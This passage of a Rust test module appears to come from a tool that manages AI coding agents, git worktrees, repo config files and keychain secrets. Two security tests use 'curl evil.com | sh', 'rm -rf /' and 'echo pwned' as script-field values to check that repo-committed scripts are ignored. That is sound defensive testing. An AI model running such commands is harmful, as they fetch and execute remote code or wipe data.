        assert_eq!(loaded.tab_ordering_mode, TabOrderingMode::Free);
    }

    #[test]
    fn agents_config_round_trip() {
        let dir = TempDir::new().unwrap();
        let mut agents = AgentsConfig::default();
        let mut env = HashMap::new();
        env.insert("ANTHROPIC_API_KEY".to_string(), "sk-test".to_string());
        agents.agents.insert(
            "claude".to_string(),
            AgentSettings {
                run_configs: vec![
                    AgentRunConfig {
                        name: "Default".to_string(),
                        command: "claude".to_string(),
                        args: vec![],
                        env: HashMap::new(),
                        is_default: true,
                    },
                    AgentRunConfig {
                        name: "Sonnet Print".to_string(),
                        command: "claude".to_string(),
                        args: vec![
                            "--model".to_string(),
                            "sonnet".to_string(),
                            "--print".to_string(),
                        ],
                        env,
                        is_default: false,
                    },
                ],
                auto_retry_on_error: false,
                headless_template: None,
                env_flags: HashMap::new(),
                intent_tab_title: Some(false),
                suggest_followups: None,
                hook_instrumentation: None,
            },
        );
        let loaded: AgentsConfig = round_trip_in_dir(dir.path(), "agents.json", &agents);
        assert_eq!(loaded.agents.len(), 1);
        let claude = loaded.agents.get("claude").unwrap();
        assert_eq!(claude.run_configs.len(), 2);
        assert_eq!(claude.run_configs[0].name, "Default");
        assert!(claude.run_configs[0].is_default);
        assert_eq!(claude.run_configs[1].name, "Sonnet Print");
        assert_eq!(
            claude.run_configs[1].args,
            vec!["--model", "sonnet", "--print"]
        );
        assert_eq!(
            claude.run_configs[1].env.get("ANTHROPIC_API_KEY").unwrap(),
            "sk-test"
        );
        assert!(!claude.run_configs[1].is_default);
        assert_eq!(claude.intent_tab_title, Some(false));
        assert_eq!(claude.suggest_followups, None);
    }

    #[test]
    fn agents_config_missing_file_returns_default() {
        let cfg: AgentsConfig = load_json_config("nonexistent-agents-12345.json");
        assert!(cfg.agents.is_empty());
    }

    // -- Worktree config tests --

    #[test]
    fn worktree_enums_serialize_as_expected() {
        assert_eq!(
            serde_json::to_string(&WorktreeStorage::Sibling).unwrap(),
            r#""sibling""#
        );
        assert_eq!(
            serde_json::to_string(&WorktreeStorage::AppDir).unwrap(),
            r#""app-dir""#
        );
        assert_eq!(
            serde_json::to_string(&WorktreeStorage::InsideRepo).unwrap(),
            r#""inside-repo""#
        );
        assert_eq!(
            serde_json::to_string(&WorktreeStorage::ClaudeCodeDefault).unwrap(),
            r#""claude-code-default""#
        );
        assert_eq!(
            serde_json::to_string(&OrphanCleanup::Ask).unwrap(),
            r#""ask""#
        );
        assert_eq!(
            serde_json::to_string(&OrphanCleanup::On).unwrap(),
            r#""on""#
        );
        assert_eq!(
            serde_json::to_string(&MergeStrategy::Squash).unwrap(),
            r#""squash""#
        );
        assert_eq!(
            serde_json::to_string(&WorktreeAfterMerge::Archive).unwrap(),
            r#""archive""#
        );
        assert_eq!(
            serde_json::to_string(&WorktreeAfterMerge::Delete).unwrap(),
            r#""delete""#
        );
        assert_eq!(
            serde_json::to_string(&AutoDeleteOnPrClose::Off).unwrap(),
            r#""off""#
        );
        assert_eq!(
            serde_json::to_string(&AutoDeleteOnPrClose::Ask).unwrap(),
            r#""ask""#
        );
        assert_eq!(
            serde_json::to_string(&AutoDeleteOnPrClose::Auto).unwrap(),
            r#""auto""#
        );
    }

    #[test]
    fn worktree_enums_deserialize() {
        assert_eq!(
            serde_json::from_str::<WorktreeStorage>(r#""sibling""#).unwrap(),
            WorktreeStorage::Sibling
        );
        assert_eq!(
            serde_json::from_str::<WorktreeStorage>(r#""app-dir""#).unwrap(),
            WorktreeStorage::AppDir
        );
        assert_eq!(
            serde_json::from_str::<WorktreeStorage>(r#""inside-repo""#).unwrap(),
            WorktreeStorage::InsideRepo
        );
        assert_eq!(
            serde_json::from_str::<WorktreeStorage>(r#""claude-code-default""#).unwrap(),
            WorktreeStorage::ClaudeCodeDefault
        );
        assert_eq!(
            serde_json::from_str::<OrphanCleanup>(r#""ask""#).unwrap(),
            OrphanCleanup::Ask
        );
        assert_eq!(
            serde_json::from_str::<MergeStrategy>(r#""rebase""#).unwrap(),
            MergeStrategy::Rebase
        );
        assert_eq!(
            serde_json::from_str::<WorktreeAfterMerge>(r#""ask""#).unwrap(),
            WorktreeAfterMerge::Ask
        );
        assert_eq!(
            serde_json::from_str::<AutoDeleteOnPrClose>(r#""off""#).unwrap(),
            AutoDeleteOnPrClose::Off
        );
        assert_eq!(
            serde_json::from_str::<AutoDeleteOnPrClose>(r#""ask""#).unwrap(),
            AutoDeleteOnPrClose::Ask
        );
        assert_eq!(
            serde_json::from_str::<AutoDeleteOnPrClose>(r#""auto""#).unwrap(),
            AutoDeleteOnPrClose::Auto
        );
    }

    #[test]
    fn repo_defaults_worktree_fields_round_trip() {
        let dir = TempDir::new().unwrap();
        let cfg = RepoDefaultsConfig {
            worktree_storage: WorktreeStorage::InsideRepo,
            prompt_on_create: false,
            prompt_on_worktree_switch: false,
            delete_branch_on_remove: false,
            auto_archive_merged: true,
            orphan_cleanup: OrphanCleanup::On,
            pr_merge_strategy: MergeStrategy::Squash,
            after_merge: WorktreeAfterMerge::Delete,
            auto_delete_on_pr_close: AutoDeleteOnPrClose::Auto,
            ..RepoDefaultsConfig::default()
        };
        let loaded: RepoDefaultsConfig = round_trip_in_dir(dir.path(), "repo-defaults.json", &cfg);
        assert_eq!(loaded.worktree_storage, WorktreeStorage::InsideRepo);
        assert!(!loaded.prompt_on_create);
        assert!(!loaded.prompt_on_worktree_switch);
        assert!(!loaded.delete_branch_on_remove);
        assert!(loaded.auto_archive_merged);
        assert_eq!(loaded.orphan_cleanup, OrphanCleanup::On);
        assert_eq!(loaded.pr_merge_strategy, MergeStrategy::Squash);
        assert_eq!(loaded.after_merge, WorktreeAfterMerge::Delete);
        assert_eq!(loaded.auto_delete_on_pr_close, AutoDeleteOnPrClose::Auto);
    }

    #[test]
    fn repo_defaults_serde_default_for_worktree_fields() {
        // Old config without worktree fields should deserialize with defaults
        let json = r#"{"base_branch":"automatic","copy_ignored_files":false}"#;
        let loaded: RepoDefaultsConfig = serde_json::from_str(json).unwrap();
        assert_eq!(loaded.worktree_storage, WorktreeStorage::Sibling);
        assert!(loaded.prompt_on_create);
        assert!(loaded.prompt_on_worktree_switch);
        assert!(loaded.delete_branch_on_remove);
        assert!(!loaded.auto_archive_merged);
        assert_eq!(loaded.orphan_cleanup, OrphanCleanup::Ask);
        // squash is the global default; old configs without the field inherit it
        assert_eq!(loaded.pr_merge_strategy, MergeStrategy::Squash);
        assert_eq!(loaded.after_merge, WorktreeAfterMerge::Archive);
        assert_eq!(loaded.auto_delete_on_pr_close, AutoDeleteOnPrClose::Off);
    }

    #[test]
    fn repo_settings_entry_worktree_fields_round_trip() {
        let dir = TempDir::new().unwrap();
        let mut map = RepoSettingsMap::default();
        map.repos.insert(
            "/my/repo".to_string(),
            RepoSettingsEntry {
                path: "/my/repo".to_string(),
                worktree_storage: Some(WorktreeStorage::AppDir),
                prompt_on_create: Some(false),
                prompt_on_worktree_switch: Some(false),
                delete_branch_on_remove: Some(false),
                auto_archive_merged: Some(true),
                orphan_cleanup: Some(OrphanCleanup::Off),
                pr_merge_strategy: Some(MergeStrategy::Rebase),
                after_merge: Some(WorktreeAfterMerge::Ask),
                auto_delete_on_pr_close: Some(AutoDeleteOnPrClose::Ask),
                ..RepoSettingsEntry::default()
            },
        );
        let loaded: RepoSettingsMap = round_trip_in_dir(dir.path(), "repo-settings.json", &map);
        let entry = loaded.repos.get("/my/repo").unwrap();
        assert_eq!(entry.worktree_storage, Some(WorktreeStorage::AppDir));
        assert_eq!(entry.prompt_on_create, Some(false));
        assert_eq!(entry.prompt_on_worktree_switch, Some(false));
        assert_eq!(entry.delete_branch_on_remove, Some(false));
        assert_eq!(entry.auto_archive_merged, Some(true));
        assert_eq!(entry.orphan_cleanup, Some(OrphanCleanup::Off));
        assert_eq!(entry.pr_merge_strategy, Some(MergeStrategy::Rebase));
        assert_eq!(entry.after_merge, Some(WorktreeAfterMerge::Ask));
        assert_eq!(
            entry.auto_delete_on_pr_close,
            Some(AutoDeleteOnPrClose::Ask)
        );
    }

    #[test]
    fn repo_settings_entry_null_worktree_fields() {
        // Old repo settings without worktree fields should have None
        let json = r#"{"path":"/my/repo","display_name":"test","base_branch":"main"}"#;
        let entry: RepoSettingsEntry = serde_json::from_str(json).unwrap();
        assert_eq!(entry.worktree_storage, None);
        assert_eq!(entry.prompt_on_create, None);
        assert_eq!(entry.prompt_on_worktree_switch, None);
        assert_eq!(entry.delete_branch_on_remove, None);
        assert_eq!(entry.orphan_cleanup, None);
    }

    #[test]
    fn has_custom_settings_true_when_worktree_storage_set() {
        let entry = RepoSettingsEntry {
            worktree_storage: Some(WorktreeStorage::InsideRepo),
            ..RepoSettingsEntry::default()
        };
        assert!(entry.has_custom_settings());
    }

    #[test]
    fn has_custom_settings_true_when_prompt_on_create_set() {
        let entry = RepoSettingsEntry {
            prompt_on_create: Some(false),
            ..RepoSettingsEntry::default()
        };
        assert!(entry.has_custom_settings());
    }

    #[test]
    fn has_custom_settings_true_when_prompt_on_worktree_switch_set() {
        let entry = RepoSettingsEntry {
            prompt_on_worktree_switch: Some(false),
            ..RepoSettingsEntry::default()
        };
        assert!(entry.has_custom_settings());
    }

    // -- Note image tests --
    // These tests use the global config_dir override and must run serially.

    #[test]
    #[serial_test::serial]
    fn save_note_image_creates_file() {
        use base64::{Engine as _, engine::general_purpose};

        let dir = TempDir::new().unwrap();
        let _guard = set_config_dir_override(dir.path().to_path_buf());

        // A minimal valid PNG (1x1 pixel)
        let png_bytes: &[u8] = &[
            0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A, // PNG signature
            0x00, 0x00, 0x00, 0x0D, 0x49, 0x48, 0x44, 0x52, // IHDR chunk
            0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, // 1x1
            0x08, 0x02, 0x00, 0x00, 0x00, 0x90, 0x77, 0x53, 0xDE,
        ];
        let b64 = general_purpose::STANDARD.encode(png_bytes);

        let result = save_note_image("test-note-1".to_string(), b64, "png".to_string());
        assert!(
            result.is_ok(),
            "save_note_image should succeed: {:?}",
            result
        );

        let path = std::path::PathBuf::from(result.unwrap());
        assert!(path.exists(), "Image file should exist on disk");
        assert!(path.to_string_lossy().contains("note-images/test-note-1/"));
        assert!(path.to_string_lossy().ends_with(".png"));

        // Verify content matches
        let saved = fs::read(&path).unwrap();
        assert_eq!(saved, png_bytes);
    }

    #[test]
    #[serial_test::serial]
    fn save_note_image_rejects_oversized() {
        use base64::{Engine as _, engine::general_purpose};

        let dir = TempDir::new().unwrap();
        let _guard = set_config_dir_override(dir.path().to_path_buf());

        // Create data slightly over 10 MB
        let big_data = vec![0u8; MAX_IMAGE_SIZE + 1];
        let b64 = general_purpose::STANDARD.encode(&big_data);

        let result = save_note_image("test-note-big".to_string(), b64, "png".to_string());
        assert!(result.is_err());
        assert!(result.unwrap_err().contains("too large"));
    }

    #[test]
    #[serial_test::serial]
    fn save_note_image_rejects_invalid_base64() {
        let dir = TempDir::new().unwrap();
        let _guard = set_config_dir_override(dir.path().to_path_buf());

        let result = save_note_image(
            "test-note-bad".to_string(),
            "not-valid-base64!!!@@@".to_string(),
            "png".to_string(),
        );
        assert!(result.is_err());
        assert!(result.unwrap_err().contains("Invalid base64"));
    }

    #[test]
    #[serial_test::serial]
    fn save_note_image_rejects_path_traversal() {
        let dir = TempDir::new().unwrap();
        let _guard = set_config_dir_override(dir.path().to_path_buf());

        let result = save_note_image("../etc".to_string(), "AAAA".to_string(), "png".to_string());
        assert!(result.is_err());
        assert!(result.unwrap_err().contains("invalid characters"));

        let result2 = save_note_image("foo/bar".to_string(), "AAAA".to_string(), "png".to_string());
        assert!(result2.is_err());
    }

    #[test]
    #[serial_test::serial]
    fn delete_note_assets_removes_directory() {
        let dir = TempDir::new().unwrap();
        let _guard = set_config_dir_override(dir.path().to_path_buf());

        // Create a note-images dir with files
        let note_dir = dir.path().join("note-images").join("note-to-delete");
        fs::create_dir_all(&note_dir).unwrap();
        fs::write(note_dir.join("img1.png"), b"fake-png").unwrap();
        fs::write(note_dir.join("img2.png"), b"fake-png-2").unwrap();
        assert!(note_dir.exists());

        let result = delete_note_assets("note-to-delete".to_string());
        assert!(result.is_ok());
        assert!(!note_dir.exists(), "Directory should be removed");
    }

    #[test]
    #[serial_test::serial]
    fn delete_note_assets_noop_when_missing() {
        let dir = TempDir::new().unwrap();
        let _guard = set_config_dir_override(dir.path().to_path_buf());

        let result = delete_note_assets("nonexistent-note".to_string());
        assert!(result.is_ok(), "Should succeed even if dir doesn't exist");
    }

    #[test]
    fn repo_local_config_loads_valid_json() {
        let dir = TempDir::new().unwrap();
        let json = r#"{
            "base_branch": "develop",
            "delete_branch_on_remove": false,
            "pr_merge_strategy": "squash"
        }"#;
        fs::write(dir.path().join(".tuic.json"), json).unwrap();

        let config = load_repo_local_config_from_path(dir.path());
        assert!(config.is_some());
        let config = config.unwrap();
        assert_eq!(config.base_branch.as_deref(), Some("develop"));
        assert_eq!(config.delete_branch_on_remove, Some(false));
        assert_eq!(config.pr_merge_strategy, Some(MergeStrategy::Squash));
        assert!(config.copy_ignored_files.is_none());
    }

    #[test]
    fn repo_local_config_returns_none_when_missing() {
        let dir = TempDir::new().unwrap();
        let config = load_repo_local_config_from_path(dir.path());
        assert!(config.is_none());
    }

    #[test]
    fn repo_local_config_returns_none_for_malformed_json() {
        let dir = TempDir::new().unwrap();
        fs::write(dir.path().join(".tuic.json"), "not valid json {{{").unwrap();
        let config = load_repo_local_config_from_path(dir.path());
        assert!(config.is_none());
    }

    #[test]
    fn repo_local_config_handles_empty_object() {
        let dir = TempDir::new().unwrap();
        fs::write(dir.path().join(".tuic.json"), "{}").unwrap();
        let config = load_repo_local_config_from_path(dir.path());
        assert!(config.is_some());
        let config = config.unwrap();
        assert!(config.base_branch.is_none());
    }

    #[test]
    fn repo_local_config_ignores_unknown_fields() {
        let dir = TempDir::new().unwrap();
        let json = r#"{"base_branch": "main", "unknown_field": 42}"#;
        fs::write(dir.path().join(".tuic.json"), json).unwrap();
        let config = load_repo_local_config_from_path(dir.path());
        assert!(config.is_some());
        assert_eq!(config.unwrap().base_branch.as_deref(), Some("main"));
    }

    #[test]
    fn repo_local_config_ignores_script_fields() {
        // Script fields (setup_script, run_script, archive_script) were intentionally
        // removed from RepoLocalConfig to prevent executing repo-committed scripts
        // without TOFU confirmation. Verify they are silently ignored.
        let dir = TempDir::new().unwrap();
        let json = r#"{
            "base_branch": "develop",
            "setup_script": "curl evil.com | sh",
            "run_script": "rm -rf /",
            "archive_script": "echo pwned"
        }"#;
        fs::write(dir.path().join(".tuic.json"), json).unwrap();
        let config = load_repo_local_config_from_path(dir.path());
        assert!(
            config.is_some(),
            "config should parse despite unknown script fields"
        );
        let config = config.unwrap();
        assert_eq!(config.base_branch.as_deref(), Some("develop"));
        // RepoLocalConfig has no script fields — they are silently dropped by serde
        // No field to assert on; the fact that parsing succeeds without script
        // fields on the struct is the security guarantee.
    }

    #[test]
    fn overlay_repo_local_config_copies_set_fields_preserves_rest() {
        // base already has a value the per-repo entry leaves as inherit (None)
        let base = RepoLocalConfig {
            mcp_upstreams: Some(vec!["github".to_string()]),
            after_merge: Some(WorktreeAfterMerge::Delete),
            ..RepoLocalConfig::default()
        };
        let entry = RepoSettingsEntry {
            base_branch: Some("develop".to_string()),
            copy_ignored_files: Some(true),
            pr_merge_strategy: Some(MergeStrategy::Squash),
            // after_merge left None → must NOT clobber base's value
            ..RepoSettingsEntry::default()
        };

        let merged = overlay_repo_local_config(base, &entry);
        // explicit overrides copied
        assert_eq!(merged.base_branch.as_deref(), Some("develop"));
        assert_eq!(merged.copy_ignored_files, Some(true));
        assert_eq!(merged.pr_merge_strategy, Some(MergeStrategy::Squash));
        // inherit (None) preserved existing base values
        assert_eq!(merged.after_merge, Some(WorktreeAfterMerge::Delete));
        assert_eq!(
            merged.mcp_upstreams.as_deref(),
            Some(&["github".to_string()][..])
        );
        // untouched field stays None
        assert!(merged.copy_untracked_files.is_none());
    }

    #[test]
    fn overlay_repo_local_config_never_includes_scripts() {
        // RepoSettingsEntry carries script overrides, but RepoLocalConfig has no
        // script fields — verify the serialized .tuic.json can never leak them.
        let entry = RepoSettingsEntry {
            base_branch: Some("main".to_string()),
            setup_script: Some("curl evil.com | sh".to_string()),
            run_script: Some("rm -rf /".to_string()),
            ..RepoSettingsEntry::default()
        };
        let merged = overlay_repo_local_config(RepoLocalConfig::default(), &entry);
        let json = serde_json::to_string(&merged).unwrap();
        assert!(json.contains("base_branch"));
        assert!(!json.contains("setup_script"));
        assert!(!json.contains("run_script"));
        assert!(!json.contains("evil.com"));
    }

    #[test]
    fn repo_local_config_serializes_sparsely() {
        // Only explicitly-set fields are written; inherit (None) fields are omitted
        // so the committed .tuic.json stays minimal.
        let cfg = RepoLocalConfig {
            base_branch: Some("develop".to_string()),
            ..RepoLocalConfig::default()
        };
        let json = serde_json::to_string(&cfg).unwrap();
        assert_eq!(json, r#"{"base_branch":"develop"}"#);
    }

    #[test]
    fn overlay_then_roundtrip_through_tuic_json() {
        let dir = TempDir::new().unwrap();
        let entry = RepoSettingsEntry {
            base_branch: Some("develop".to_string()),
            delete_branch_on_remove: Some(false),
            ..RepoSettingsEntry::default()
        };
        let merged = overlay_repo_local_config(RepoLocalConfig::default(), &entry);
        let json = serde_json::to_string_pretty(&merged).unwrap();
        fs::write(dir.path().join(".tuic.json"), json).unwrap();

        let reloaded = load_repo_local_config_from_path(dir.path()).unwrap();
        assert_eq!(reloaded.base_branch.as_deref(), Some("develop"));
        assert_eq!(reloaded.delete_branch_on_remove, Some(false));
        assert!(reloaded.copy_ignored_files.is_none());
    }

    #[test]
    fn fill_repo_local_defaults_populates_empty_config() {
        // Regression: a user who relies on global defaults (no per-repo overrides)
        // must NOT get an empty {} .tuic.json — the export captures the effective
        // worktree/branch settings sourced from the global defaults.
        let mut defaults: RepoDefaultsConfig = serde_json::from_str("{}").unwrap();
        defaults.base_branch = "develop".to_string();
        defaults.copy_ignored_files = true;
        defaults.delete_branch_on_remove = false;

        let filled = fill_repo_local_defaults(RepoLocalConfig::default(), &defaults);
        assert_eq!(filled.base_branch.as_deref(), Some("develop"));
        assert_eq!(filled.copy_ignored_files, Some(true));
        assert_eq!(filled.delete_branch_on_remove, Some(false));
        assert!(filled.worktree_storage.is_some());
        assert!(filled.pr_merge_strategy.is_some());

        let json = serde_json::to_string(&filled).unwrap();
        assert_ne!(json, "{}", "exported config must not be empty");
        assert!(json.contains("base_branch"));
    }

    #[test]
    fn fill_repo_local_defaults_preserves_existing_and_skips_mcp() {
        // Fields already present in the .tuic.json base (manually set, or a team
        // value) win over the global default and must not be clobbered.
        // mcp_upstreams has no global default, so it stays exactly as-is.
        let base = RepoLocalConfig {
            base_branch: Some("release".to_string()),
            mcp_upstreams: Some(vec!["github".to_string()]),
            ..RepoLocalConfig::default()
        };
        let mut defaults: RepoDefaultsConfig = serde_json::from_str("{}").unwrap();
        defaults.base_branch = "develop".to_string();

        let filled = fill_repo_local_defaults(base, &defaults);
        assert_eq!(filled.base_branch.as_deref(), Some("release"));
        assert_eq!(
            filled.mcp_upstreams.as_deref(),
            Some(&["github".to_string()][..])
        );
        // A field neither set in base nor overridden gets the global default.
        assert!(filled.worktree_storage.is_some());
    }

    #[test]
    fn export_precedence_per_repo_over_defaults() {
        // Mirrors save_repo_local_config: fill defaults, then overlay per-repo.
        // Per-repo override must win; non-overridden fields keep the default.
        let mut defaults: RepoDefaultsConfig = serde_json::from_str("{}").unwrap();
        defaults.base_branch = "develop".to_string();
        let entry = RepoSettingsEntry {
            base_branch: Some("feature".to_string()),
            ..RepoSettingsEntry::default()
        };

        let base = fill_repo_local_defaults(RepoLocalConfig::default(), &defaults);
        let merged = overlay_repo_local_config(base, &entry);
        assert_eq!(merged.base_branch.as_deref(), Some("feature"));
        assert!(merged.worktree_storage.is_some());
    }

    #[test]
    #[serial_test::serial]
    fn get_note_images_dir_returns_path() {
        let dir = TempDir::new().unwrap();
        let _guard = set_config_dir_override(dir.path().to_path_buf());

        let result = get_note_images_dir();
        assert!(
            result.ends_with("note-images"),
            "Should end with note-images, got: {result}"
        );
    }

    #[cfg(unix)]
    #[test]
    fn copy_dir_recursive_preserves_symlinks() {
        let src = TempDir::new().unwrap();
        let dst = TempDir::new().unwrap();

        // Create a real file and a symlink to it
        let real_file = src.path().join("real.txt");
        fs::write(&real_file, "hello").unwrap();
        let link_path = src.path().join("link.txt");
        std::os::unix::fs::symlink(&real_file, &link_path).unwrap();

        // Create a real subdir and a symlink to it
        let sub = src.path().join("subdir");
        fs::create_dir(&sub).unwrap();
        fs::write(sub.join("inner.txt"), "world").unwrap();
        let dir_link = src.path().join("dir-link");
        std::os::unix::fs::symlink(&sub, &dir_link).unwrap();

        let dest = dst.path().join("out");
        copy_dir_recursive(src.path(), &dest).unwrap();

        // Verify the file symlink was recreated (not copied as a regular file)
        let dest_link = dest.join("link.txt");
        assert!(
            dest_link
                .symlink_metadata()
                .unwrap()
                .file_type()
                .is_symlink()
        );
        assert_eq!(fs::read_link(&dest_link).unwrap(), real_file);

        // Verify the dir symlink was recreated
        let dest_dir_link = dest.join("dir-link");
        assert!(
            dest_dir_link
                .symlink_metadata()
                .unwrap()
                .file_type()
                .is_symlink()
        );
        assert_eq!(fs::read_link(&dest_dir_link).unwrap(), sub);

        // Verify the real file was copied normally
        assert!(
            !dest
                .join("real.txt")
                .symlink_metadata()
                .unwrap()
                .file_type()
                .is_symlink()
        );
        assert_eq!(fs::read_to_string(dest.join("real.txt")).unwrap(), "hello");
    }

    #[test]
    fn resolve_setup_script_per_repo_override() {
        let mut settings = RepoSettingsMap::default();
        settings.repos.insert(
            "/repo".to_string(),
            RepoSettingsEntry {
                setup_script: Some("pnpm install".to_string()),
                ..RepoSettingsEntry::default()
            },
        );
        let defaults = RepoDefaultsConfig::default();
        assert_eq!(
            resolve_setup_script_from(&settings, &defaults, "/repo"),
            Some("pnpm install".to_string()),
        );
    }

    #[test]
    fn resolve_setup_script_falls_through_to_defaults() {
        let settings = RepoSettingsMap::default();
        let defaults = RepoDefaultsConfig {
            setup_script: "npm install".to_string(),
            ..RepoDefaultsConfig::default()
        };
        assert_eq!(
            resolve_setup_script_from(&settings, &defaults, "/repo"),
            Some("npm install".to_string()),
        );
    }

    #[test]
    fn resolve_setup_script_empty_override_blocks_default() {
        let mut settings = RepoSettingsMap::default();
        settings.repos.insert(
            "/repo".to_string(),
            RepoSettingsEntry {
                setup_script: Some(String::new()),
                ..RepoSettingsEntry::default()
            },
        );
        let defaults = RepoDefaultsConfig {
            setup_script: "npm install".to_string(),
            ..RepoDefaultsConfig::default()
        };
        assert_eq!(
            resolve_setup_script_from(&settings, &defaults, "/repo"),
            None,
        );
    }

    #[test]
    fn resolve_setup_script_no_config_returns_none() {
        let settings = RepoSettingsMap::default();
        let defaults = RepoDefaultsConfig::default();
        assert_eq!(
            resolve_setup_script_from(&settings, &defaults, "/repo"),
            None,
        );
    }

    #[test]
    fn resolve_setup_script_null_override_falls_through() {
        let mut settings = RepoSettingsMap::default();
        settings.repos.insert(
            "/repo".to_string(),
            RepoSettingsEntry {
                setup_script: None,
                ..RepoSettingsEntry::default()
            },
        );
        let defaults = RepoDefaultsConfig {
            setup_script: "yarn install".to_string(),
            ..RepoDefaultsConfig::default()
        };
        assert_eq!(
            resolve_setup_script_from(&settings, &defaults, "/repo"),
            Some("yarn install".to_string()),
        );
    }

    #[test]
    fn is_experimental_enabled_gates_on_parent() {
        let mut cfg = AppConfig::default();
        assert!(!cfg.is_experimental_enabled(true));
        assert!(!cfg.is_experimental_enabled(false));

        cfg.experimental_features_enabled = true;
        assert!(cfg.is_experimental_enabled(true));
        assert!(!cfg.is_experimental_enabled(false));
    }

    // --- Vault-backed secrets: failure must never look like absence (#488-5576) ---

    /// Restore the read-fault flag even if the test panics, so one failure cannot
    /// cascade into every later test in the binary.
    struct ReadFaultGuard;
    impl Drop for ReadFaultGuard {
        fn drop(&mut self) {
            crate::credentials::MOCK_FAIL_READS.store(false, std::sync::atomic::Ordering::SeqCst);
        }
    }
    fn fail_vault_reads() -> ReadFaultGuard {
        crate::credentials::MOCK_FAIL_READS.store(true, std::sync::atomic::Ordering::SeqCst);
        ReadFaultGuard
    }

    /// The core of the bug: a keychain that cannot be read used to be indistinguishable
    /// from a keychain holding nothing. `*_exists` went false, which made
    /// `preserve_redacted_app_config_secrets` skip the field, and the next save reached
    /// the one `persist_secret` branch that calls `credentials::delete`.
    #[test]
    fn a_vault_read_failure_keeps_the_exists_flag() {
        let _fault = fail_vault_reads();
        let mut plaintext = String::new();

        let out = hydrate_one_secret(
            crate::credentials::Credential::RemoteSessionToken,
            &mut plaintext,
            true, // config.json said a secret is there
            "session token",
        );

        assert!(
            out.exists,
            "an unreadable vault must not be reported as an absent secret"
        );
        assert!(!out.migrated);
    }

    /// And the flag it keeps is what makes deletion unreachable: `persist_secret` with
    /// an empty value returns early on `exists == true` instead of deleting.
    #[test]
    fn keeping_the_flag_stops_the_next_save_from_deleting_the_secret() {
        let dir = tempfile::tempdir().expect("tempdir");
        let _guard = set_config_dir_override(dir.path().to_path_buf());
        crate::credentials::set(
            crate::credentials::Credential::RemoteSessionToken,
            "live-token",
        )
        .expect("seed vault");

        // exists=true is what a read failure now preserves.
        let kept = persist_secret(crate::credentials::Credential::RemoteSessionToken, "", true)
            .expect("persist");
        assert!(kept);
        assert_eq!(
            crate::credentials::get(crate::credentials::Credential::RemoteSessionToken)
                .expect("vault readable"),
            Some("live-token".to_string()),
            "the secret must survive a save that could not read it"
        );

        // The contrast: a genuinely absent secret (exists=false) still gets cleaned up.
        let kept = persist_secret(
            crate::credentials::Credential::RemoteSessionToken,
            "",
            false,
        )
        .expect("persist");
        assert!(!kept);
        assert_eq!(
            crate::credentials::get(crate::credentials::Credential::RemoteSessionToken)
                .expect("vault readable"),
            None
        );
    }

    /// A genuine absence is still reported as absence — the fix must not make every
    /// missing secret look present forever.
    #[test]
    fn a_genuinely_absent_secret_clears_the_flag() {
        let dir = tempfile::tempdir().expect("tempdir");
        let _guard = set_config_dir_override(dir.path().to_path_buf());
        let _ = crate::credentials::delete(crate::credentials::Credential::RelayToken);

        let mut plaintext = String::new();
        let out = hydrate_one_secret(
            crate::credentials::Credential::RelayToken,
            &mut plaintext,
            true,
            "relay token",
        );
        assert!(!out.exists, "vault answered 'not there' — believe it");
    }

    /// Plaintext still in config.json must move into the vault AND flag the file for
    /// rewriting, otherwise the cleartext copy survives on disk indefinitely.
    #[test]
    fn plaintext_migration_reports_that_the_file_must_be_rewritten() {
        let dir = tempfile::tempdir().expect("tempdir");
        let _guard = set_config_dir_override(dir.path().to_path_buf());

        let mut cfg = AppConfig::default();
        cfg.services.auth.session_token = "legacy-plaintext".to_string();

        assert!(
            hydrate_app_config_secrets(&mut cfg),
            "a migration must ask for a rewrite"
        );
        assert_eq!(
            crate::credentials::get(crate::credentials::Credential::RemoteSessionToken)
                .expect("vault readable"),
            Some("legacy-plaintext".to_string())
        );
        assert!(cfg.services.auth.session_token_exists);
    }

    /// Nothing to migrate → no rewrite. Loading the config must not write to disk on
    /// every start.
    #[test]
    fn a_plain_load_does_not_ask_for_a_rewrite() {
        let dir = tempfile::tempdir().expect("tempdir");
        let _guard = set_config_dir_override(dir.path().to_path_buf());
        let _ = crate::credentials::delete(crate::credentials::Credential::RemoteSessionToken);
        let _ = crate::credentials::delete(crate::credentials::Credential::RelayToken);
        let _ = crate::credentials::delete(crate::credentials::Credential::PushVapidPrivateKey);

        let mut cfg = AppConfig::default();
        assert!(!hydrate_app_config_secrets(&mut cfg));
    }

    // --- Serialized writes (#488-5576) ---

    /// Rotation used to update `state.session_token` and the file but never
    /// `state.config`. A later unrelated save then wrote the stale in-memory token back
    /// to the vault, resurrecting the credential the user had just rotated away.
    #[test]
    fn rotation_survives_a_later_unrelated_save() {
        let dir = tempfile::tempdir().expect("tempdir");
        let _guard = set_config_dir_override(dir.path().to_path_buf());
        let state = crate::state::tests_support::make_test_app_state();

        let rotated = rotate_session_token(&state).expect("rotate");
        assert_eq!(*state.session_token.read(), rotated);
        assert_eq!(
            state.config.read().services.auth.session_token,
            rotated,
            "the in-memory config must carry the new token, not the old one"
        );

        // An unrelated save that says nothing about tokens.
        commit_config_change(&state, |current| {
            let mut next = current.clone();
            next.font_size = 18;
            Ok(next)
        })
        .expect("unrelated save");

        assert_eq!(
            crate::credentials::get(crate::credentials::Credential::RemoteSessionToken)
                .expect("vault readable"),
            Some(rotated.clone()),
            "the unrelated save must not resurrect the pre-rotation token"
        );
        assert_eq!(state.config.read().font_size, 18);
    }

    /// Lost update: two writers used to read the same snapshot and the second one's
    /// write erased the first one's field. Serializing read-merge-persist keeps both.
    #[test]
    fn concurrent_saves_do_not_lose_each_other() {
        let dir = tempfile::tempdir().expect("tempdir");
        let _guard = set_config_dir_override(dir.path().to_path_buf());
        let state = std::sync::Arc::new(crate::state::tests_support::make_test_app_state());

        let a = {
            let state = state.clone();
            std::thread::spawn(move || {
                for _ in 0..20 {
                    commit_config_change(&state, |c| {
                        let mut n = c.clone();
                        n.font_size = 18;
                        Ok(n)
                    })
                    .expect("save a");
                }
            })
        };
        let b = {
            let state = state.clone();
            std::thread::spawn(move || {
                for _ in 0..20 {
                    commit_config_change(&state, |c| {
                        let mut n = c.clone();
                        n.services.server.enabled = true;
                        Ok(n)
                    })
                    .expect("save b");
                }
            })
        };
        a.join().expect("thread a");
        b.join().expect("thread b");

        let final_cfg = state.config.read().clone();
        assert_eq!(final_cfg.font_size, 18, "writer A's field was lost");
        assert!(
            final_cfg.services.server.enabled,
            "writer B's field was lost"
        );

